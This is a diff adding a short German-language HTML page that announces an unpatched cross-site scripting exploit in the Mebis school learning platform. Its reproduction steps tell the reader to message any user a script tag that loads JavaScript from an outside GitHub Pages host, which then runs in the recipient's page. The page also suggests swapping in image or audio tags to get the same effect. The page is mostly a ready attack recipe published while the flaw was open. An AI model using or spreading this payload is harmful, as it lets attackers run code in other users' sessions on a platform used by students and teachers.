@@ -1,0 +1,22 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=100, initial-scale=1.0">
+    <title>Lernplattform Mebis XSS exploit</title>
+</head>
+<body>
+    <h1>Ou nein!</h1>
+    <p>Neuer Mebis XSS exploit!</p>
+    <p>Status: Nicht gepatcht (14.3.2023)</p>
+
+    <h3>Reproduce</h3>
+    <p>1. Irgendjemandem auf Mebis die folgende Nachricht senden zum Beispiel:</p>
+    <xmp>
+        <SCRIPT SRC="https://onako2.github.io/js/whatThe.js"
+    </xmp>
+    <p>2. Schon wird das Skript auf der Seite ausgeführt!</p>
+
+    <h4>Dies geht auch bei Bildern, Audio usw. nur SCRIPT durch z.B. IMG replacen</h4>
+</body>
+</html>
